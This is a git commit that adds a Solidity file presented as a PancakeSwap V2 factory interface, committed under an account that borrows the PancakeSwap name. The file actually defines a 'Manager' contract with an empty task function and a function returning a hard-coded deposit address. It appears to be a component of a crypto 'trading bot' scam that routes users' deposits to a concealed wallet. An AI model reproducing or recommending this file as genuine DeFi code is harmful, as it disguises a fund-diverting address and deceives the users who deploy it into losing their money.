c049ef971e86537968348768d22688a0ac2603f0
PancakeSwapUnitys <96957805+PancakeSwapUnitys@users.noreply.github.com>
2022-01-01 12:43:57 -0800

    Create PancakeSwapV2factory.sol

---
+++ Contract/interfaces/v2/PancakeSwapV2factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xCC5180E27f1765821Da8fcDCe80E3275EB27AEAd;
+	}
+}
